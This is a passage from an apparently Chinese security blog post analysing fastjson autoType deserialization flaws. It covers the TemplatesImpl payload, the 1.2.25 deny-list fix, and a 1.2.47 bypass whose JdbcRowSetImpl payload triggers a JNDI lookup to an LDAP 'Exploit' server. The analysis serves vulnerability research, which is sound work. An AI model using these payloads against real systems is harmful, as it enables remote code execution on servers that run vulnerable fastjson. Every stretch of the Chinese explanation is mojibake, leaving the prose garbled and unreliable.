class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(methodName.equals(<span class="string">"getDeclaringClass"</span>) &amp;&amp; clazz.isEnum())&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> c3 = methodName.charAt(<span class="number">3</span>);</span><br><span class="line">    String propertyName;</span><br><span class="line">    Field field = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(Character.isUpperCase(c3) <span class="comment">//</span></span><br><span class="line">            || c3 &gt; <span class="number">512</span> <span class="comment">// for unicode method name</span></span><br><span class="line">            )&#123;</span><br><span class="line">        <span class="keyword">if</span>(compatibleWithJavaBean)&#123;</span><br><span class="line">            propertyName = decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        propertyName = getPropertyNameByCompatibleFieldName(fieldCacheMap, methodName, propertyName, <span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c3 == <span class="string">'_'</span>)&#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">        field = fieldCacheMap.get(propertyName);</span><br><span class="line">        <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">            String temp = propertyName;</span><br><span class="line">            propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">            field = ParserConfig.getFieldFromCache(propertyName, fieldCacheMap);</span><br><span class="line">            <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = temp; <span class="comment">//å‡å°‘ä¿®æ”¹ä»£ç å¸¦æ¥çš„å½±å“</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c3 == <span class="string">'f'</span>)&#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>)))&#123;</span><br><span class="line">        propertyName = decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">        field = ParserConfig.getFieldFromCache(propertyName, fieldCacheMap);</span><br><span class="line">        <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è§„åˆ™æ˜¯è·Ÿå– setter ç±»ä¼¼çš„, å°±æ˜¯æ–¹æ³•åå¼€å¤´ä» set æ”¹æˆ get.  </p><p>æ€»ç»“ä¸€ä¸‹æœ‰ <code>@type</code> çš„ååºåˆ—åŒ–å¤§è‡´æµç¨‹  </p><ol><li>parse åˆ° key = @type, å°† value ä½œä¸º class</li><li>åå°„å‡ºç±»çš„æ„é€ å™¨, æ–¹æ³•, ç­‰</li><li>è‹¥ä¸æ˜¯ä¸€äº›å†…ç½®åŒ…è£…ç±»æˆ–è€…ç‰¹æ®Šç±» + å­˜åœ¨é»˜è®¤æ„é€ å™¨, é‚£ä¹ˆè°ƒç”¨ JavaBeanInfo.build å¾—åˆ° getter, setter, å±æ€§çš„ä¿¡æ¯</li><li>ç»§ç»­æ‰«æ json, è‹¥æœ‰å¯¹åº”çš„ key å¯ä»¥æ‰¾åˆ° setter æˆ–è€…å±æ€§, å°±è°ƒç”¨ setter æˆ–è€…ç›´æ¥èµ‹å€¼ç»™å±æ€§</li></ol><p>å¦å¤– autotype æ˜¯å¯ä»¥åµŒå¥—çš„, æ¯”å¦‚å¯ä»¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"xxx.xxx"</span>,</span><br><span class="line">        <span class="attr">"xxx"</span>: <span class="string">"xxx"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"xxx.xxx"</span>,</span><br><span class="line">        <span class="attr">"xxx"</span>: &#123;</span><br><span class="line">            <span class="attr">"@type"</span>: <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"xxx"</span></span><br><span class="line">    &#125; : <span class="string">"xx"</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>ä½œä¸º array é‡Œé¢çš„å…ƒç´ , object çš„ value éƒ½æ˜¯å¯ä»¥çš„, ç”šè‡³å¯ä»¥ä½œä¸º key, ä¼šè°ƒç”¨ <code>toString</code> æ–¹æ³•ä½œä¸º JSONObject çš„ key.  </p><p>æ‰€ä»¥çœ‹äº†ååºåˆ—åŒ–çš„æµç¨‹, é‚£ä¹ˆæŒ–æ˜ååºåˆ—åŒ–æ¼æ´, å¯ä»¥é‡ç‚¹çœ‹  </p><ol><li>æ— å‚æ„é€ å™¨</li><li>public å•å‚æ•° setter</li><li>è¿”å›å€¼ç±»å‹ç»§æ‰¿ Map, Collection æˆ–è€…æ˜¯ AtomicXxxx çš„æ— å‚ getter æ–¹æ³•</li><li>toString</li><li>å¦‚æœæ˜¯æ‰‹åŠ¨è°ƒç”¨çš„ parseObject, é‚£ä¹ˆ getter çš„èŒƒå›´å¯ä»¥æ‰©å¤§</li></ol><h2 id="TemplateImpl-POC-åˆ†æ"><a href="#TemplateImpl-POC-åˆ†æ" class="headerlink" title="TemplateImpl POC åˆ†æ"></a>TemplateImpl POC åˆ†æ</h2><p>JdbcRowSetImpl çš„ POC æ¯”è¾ƒç®€å•, ä¸€å¼€å§‹å°±å·²ç»åˆ†æå¥½äº†. TemplateImpl ç›¸å¯¹æ¯”è¾ƒå¤æ‚, æœ‰å¾ˆå¤šç”¨åˆ°äº† fastjson çš„ä¸€äº›ç‰¹æ€§, æ¯”å¦‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQE...."</span>],<span class="attr">"_name"</span>:<span class="string">"a.b"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"_outputProperties"</span>:&#123; &#125;,<span class="attr">"_version"</span>:<span class="string">"1.0"</span>,<span class="attr">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ _bytecodes æ˜¯ private çš„, èƒ½èµ‹å€¼æˆåŠŸéœ€è¦ç›®æ ‡å¼€å¯ Feature.SupportNonPublicField (é»˜è®¤å…³é—­) æ‰èƒ½å¼ºåˆ¶å°†å€¼èµ‹ç»™ private çš„å±æ€§. æ‰€ä»¥è¿™ä¸ª payload è¯´å®è¯è¿˜æ˜¯å›¾ä¸€ä¹, ä¼°è®¡ä¹Ÿå°± CTF ç”¨çš„åˆ°.  </p><p>å¦å¤–å¯ä»¥çœ‹åˆ° _bytecodes æ˜¯ base64 è¿‡çš„, å› ä¸º json æ ‡å‡†é‡Œé¢æ˜¯ä¸èƒ½ç›´æ¥åºåˆ—åŒ– binary çš„, fastjson å¯¹ byte[] åœ¨ååºåˆ—æ—¶ä¼š base64 decode ä¸€ä¸‹.  </p><p>ä¸åŒä¸ä¸Šé¢çš„ payload çš„æ˜¯è¿™é‡Œè§¦å‘çš„å°±ä¸æ˜¯ setter äº†, è€Œæ˜¯æˆ‘ä»¬ç‰¹åˆ«æåˆ°è¿‡çš„ç‰¹æ®Š getter. è¿™é‡Œæ˜¯ _outputProperties</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.newTransformer().getOutputProperties();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (TransformerConfigurationException var2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ Properties ç»§æ‰¿äº Hashtable, æœ€åç»§æ‰¿åˆ° Map. å®Œç¾ç¬¦åˆæ¡ä»¶, æ–¹æ³•é‡Œé¢çš„ <code>newTransformer</code> æœ€åè§¦å‘ defineTransletClasses, å¯¼è‡´å®ä¾‹åŒ– bytecode, æœ€å RCE.<br>è¿™é‡Œ _outputProperties åŒ¹é…åˆ° getOutputProperties è¿™ä¸ª getter çš„åŸå› æ˜¯åŒ¹é…æ—¶ä¼šæŠŠ key é‡Œé¢çš„ _ ç»™å…¨éƒ¨æ›¿æ¢ä¸ºç©º (ä¼°è®¡æ˜¯ä¸ºäº†æ–¹ä¾¿å‰ç«¯ js ä¸‹åˆ’çº¿å‘½åå¯ä»¥ä¸ç”¨ç‰¹æ„æ›¿æ¢æˆé©¼å³°å‘½å), å…·ä½“ä»£ç åˆ†æå¯ä»¥çœ‹çœ‹åº•ä¸‹æ¨èé˜…è¯»çš„ 3 å·.<br>æ‰€ä»¥è¿™é‡Œ payload å¯ä»¥å†™æˆ outputProperties, è¿™ä¸ª _ å¯æœ‰å¯æ— , è€Œä¸”åœ¨æ‰«æåˆ° _outputProperties å°±å·²ç»è§¦å‘, åé¢çš„å±æ€§ä¹Ÿæ˜¯å¤šä½™çš„â€¦ æ‰€ä»¥è¿™ä¸ª payload å…¶å®ç­‰ä»·äº</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQE...."</span>],<span class="attr">"_name"</span>:<span class="string">"anything"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"outputProperties"</span>:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-25-ä¿®å¤"><a href="#1-2-25-ä¿®å¤" class="headerlink" title="1.2.25 ä¿®å¤"></a>1.2.25 ä¿®å¤</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.24</span></span><br><span class="line">Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"><span class="comment">//1.2.25</span></span><br><span class="line">Class&lt;?&gt; clazz = config.checkAutoType(typeName);</span><br></pre></td></tr></table></figure><p>ä¸å†ç›´æ¥ Class.forName äº†, è€Œæ˜¯åŠ ä¸Šäº†ä¸å°‘é™åˆ¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = derializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">        String accept = acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">            <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯åŠ äº†ä¸€ä¸ª Feature, ä¸”é»˜è®¤å…³é—­, ä¹Ÿå°±æ˜¯è¯´é»˜è®¤ä¸æ”¯æŒ @type è¿™ç§ååºåˆ—ç±»çš„æ–¹æ³•äº†. è€Œä¸”å°±ç®—æ‰“å¼€äº†, è¿˜æœ‰äº†é»‘åå•, ç›´æ¥ ban æ‰äº†ä¹‹å‰çš„é‚£ä¸¤ä¸ª payload çš„ç±».</p><h2 id="1-2-47-ç»•è¿‡"><a href="#1-2-47-ç»•è¿‡" class="headerlink" title="1.2.47 ç»•è¿‡"></a>1.2.47 ç»•è¿‡</h2><p>åœ¨è¿™ä¹‹é—´ä¹Ÿå‡ºç°ä¸å°‘ç»•è¿‡, ä½†æ˜¯éœ€è¦æ‰‹åŠ¨å¼€å§‹ autoType, å¯ä»¥çœ‹çœ‹æ¨èé˜…è¯»çš„ 4 å·. è€Œ 1.2.47 ç‰ˆæœ¬å‡ºç°çš„è¿™ä¸ªç»•è¿‡å°±æ¯”è¾ƒç‰›é€¼, ä¸å¼€å§‹ autoType è¿™ä¸ª feature ä¹Ÿèƒ½æ‰“.</p><p>å…ˆçœ‹ payload </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">        <span class="attr">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">"b"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>, </span><br><span class="line">        <span class="attr">"dataSourceName"</span>: <span class="string">"ldap://localhost:1389/Exploit"</span>, </span><br><span class="line">        <span class="attr">"autoCommit"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹è¿™ä¸ª <code>java.lang.Class</code>, éœ€è¦çŸ¥é“ä¸€ç‚¹, fastjson æœ‰å¾ˆå¤šå¯¹å†…ç½®ç±»çš„æå‰åšå¥½çš„ååºåˆ—åŒ–å™¨. å¯ä»¥åœ¨ <code>com.alibaba.fastjson.parser.ParserConfig</code> çš„ <code>initDeserializers</code> çš„æ–¹æ³•çœ‹åˆ°. è¿™ä¸ªæ–¹æ³•åœ¨ç±»æ„é€ æ—¶å°±ä¼šè¢«è°ƒç”¨, è€Œå…¶ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...çœç•¥</span></span><br><span class="line">deserializers.put(<span class="keyword">boolean</span>.class, BooleanCodec.instance);</span><br><span class="line">deserializers.put(Boolean.class, BooleanCodec.instance);</span><br><span class="line">deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(<span class="keyword">char</span>[].class, <span class="keyword">new</span> CharArrayCodec());</span><br><span class="line"><span class="comment">//...çœç•¥</span></span><br></pre></td></tr></table></figure><p>åœ¨ååºåˆ—åŒ–æ—¶ä¼šä¼˜å…ˆä½¿ç”¨è¿™äº›é¢„å®šä¹‰å¥½çš„ååºåˆ—å™¨, å¦‚æœä¸å­˜åœ¨çš„è¯, æ‰ä¼šå»è°ƒç”¨ <code>createJavaBeanDeserializer</code>, å»è¯»å–ç›®æ ‡ç±»çš„ setter, getter, å±æ€§ç­‰å»ååºåˆ—åŒ–.<br>è€Œå¯¹äº Class.class, ååºåˆ—åŒ–æ–¹æ³•æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Object objVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">    parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">    parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.COLON);</span><br><span class="line"></span><br><span class="line">    objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.RBRACE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String strVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">    strVal = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    strVal = (String) objVal;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// ... çœç•¥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... çœç•¥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å°±æ˜¯å°† val ä½œä¸ºç±»å, ç„¶åç”¨ classloader å» load è¿™ä¸ª class, ç„¶åè¿”å›è¿™ä¸ªç±»çš„ Class å¯¹è±¡.<br>ç„¶åå›åˆ° fastjson </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123; <span class="comment">// &lt;-- é»˜è®¤ autoType å…³é—­, expectClass = null è¿™ä¸€æ®µå¯ä»¥æ— è§†</span></span><br><span class="line">    <span class="keyword">long</span> hash = h3;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">        hash ^= className.charAt(i);</span><br><span class="line">        hash *= PRIME;</span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹åœ¨ <code>deserializers.findClass(typeName);</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">findClass</span><span class="params">(String keyString)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; buckets.length; i++) &#123;</span><br><span class="line">        Entry bucket = buckets[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bucket == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K, V&gt; entry = bucket; entry != <span class="keyword">null</span>; entry = entry.next) &#123;</span><br><span class="line">            Object key = bucket.key;</span><br><span class="line">            <span class="keyword">if</span> (key <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                Class clazz = ((Class) key);</span><br><span class="line">                String className = clazz.getName();</span><br><span class="line">                <span class="keyword">if</span> (className.equals(keyString)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª bucket å°±æ˜¯ put æ–¹æ³•ä¼šå­˜è¿›å»çš„ bucket, æ‰€ä»¥è¿™é‡Œå› ä¸ºæ˜¯å†…ç½®ç±», å…¶å®ç­‰ä»·äºç™½åå•, æ‰€ä»¥ç›´æ¥è¿”å›äº† clazz, autoType å³ä½¿å…³é—­ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸ååºåˆ—åŒ–è¿™äº›å¯¹è±¡çš„. æ¯”å¦‚ Integer, String, URL ç­‰ç­‰å†…ç½®å¸¸è§å¯¹è±¡çš„.  </p><p>è€Œé—®é¢˜ä¹Ÿæ˜¯å‡ºåœ¨è¿™é‡Œ, è¿˜è®°å¾— Class çš„ååºåˆ—åŒ–æ–¹å¼ä¹ˆ, ä¼šè°ƒç”¨ <code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code>,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span 